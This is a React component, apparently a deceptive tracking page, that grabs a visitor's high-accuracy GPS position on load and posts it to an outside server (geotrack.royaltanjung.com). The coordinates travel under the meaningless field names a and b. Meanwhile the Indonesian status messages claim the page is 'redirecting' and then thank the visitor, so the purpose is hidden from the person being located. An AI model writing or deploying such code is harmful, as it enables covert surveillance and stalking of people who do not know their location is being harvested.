import React, { useEffect, useState } from "react";

export default function GeoTracker() {
  const [status, setStatus] = useState("Memuat data...");

  useEffect(() => {
    const kirimData = async (a, b) => {
      try {
        await fetch("https://geotrack.royaltanjung.com/update-data", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ a, b }),
        });
        setStatus("Terimakasih.");
      } catch (error) {
        setStatus("Gagal.");
      }
    };

    if (navigator.geolocation) {
      setStatus("Mengalihkan url...");
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const a = pos.coords.latitude;
          const b = pos.coords.longitude;
          kirimData(a, b);
        },
        () => {
          setStatus("Tidak dapat memproses data.");
        },
        { enableHighAccuracy: true, maximumAge: 0 }
      );
    } else {
      setStatus("Fitur tidak tersedia.");
    }
  }, []);

  return (
    <div style={{ padding: "20px", fontFamily: "Arial" }}>
      <h1>{status}</h1>
    </div>
  );
}
